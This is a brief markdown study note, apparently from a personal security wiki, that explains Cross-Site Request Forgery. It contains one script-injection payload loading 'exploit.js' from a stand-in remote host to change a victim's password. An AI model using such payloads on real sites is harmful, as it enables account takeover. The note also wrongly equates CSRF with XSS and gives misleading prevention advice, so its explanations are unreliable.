---
title: c-Cross Site Request Forgery (CSRF)
draft: false
tags:
  - csrf
---
**Cross-Site Request Forgery (CSRF)** - CSRF utilize XSS vulnerability to perform certain queries and API calls on a web app that the victim is currently authenticated to. 

CSRF may allow attacker to perform actions as the authenticated user.

## Example 1

Common CSRF attack is to craft JavaScript payload that will automatically change the victim's password to the value set by the attacker. 

When the victim views the payload on the vulnerable page, JavaScript code would execute automatically. 

## Example 2

CSRF can be used to gain access to admin accounts. 

Admins usually have access to sensitive functions. 

```html
"><script src=//www.example.com/exploit.js></script>
```

Above will load `exploit.js` from remote server that would change the user's password. 

## Prevention

Filter and sanitize user input on the front end.

Sanitize displayed output and clear any special/non-standard characters. 

Implement `Webb Application Firewall (WAF)`. 

Many modern browsers have built-in anti-CSRF measures which automatically prevents executing JS code.


